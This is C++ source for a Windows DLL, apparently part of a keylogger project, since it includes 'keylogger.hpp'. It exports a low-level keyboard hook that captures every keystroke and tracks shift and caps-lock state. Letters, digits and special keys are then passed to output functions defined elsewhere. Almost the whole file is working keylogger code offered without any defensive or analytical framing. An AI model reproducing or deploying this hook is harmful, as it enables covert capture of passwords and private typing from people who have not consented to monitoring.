#include "pch.h"
#include "keylogger.hpp"

extern "C" __declspec(dllexport)
LRESULT KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION)
	{
        const auto key = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		if ((key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT) && (wParam == WM_KEYFIRST || wParam == WM_KEYLAST || wParam == WM_KEYUP)) shiftDown = !shiftDown;
		if (key->vkCode == VK_CAPITAL && wParam == WM_KEYUP) capsToggled = !capsToggled;

		if (wParam == WM_KEYFIRST || wParam == WM_SYSKEYUP)
		{
            if (key->vkCode >= 'A' && key->vkCode <= 'Z')
            {
	            PrintAlpha(key->vkCode, shiftDown ^ capsToggled);
            }
			else if (isdigit(int(key->vkCode)))
			{
				PrintDigits(key->vkCode, shiftDown);
			}
			else
			{
				PrintSpecialKeys(key->vkCode, shiftDown);
			}
		}
	}
    return CallNextHookEx(nullptr, code, wParam, lParam);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

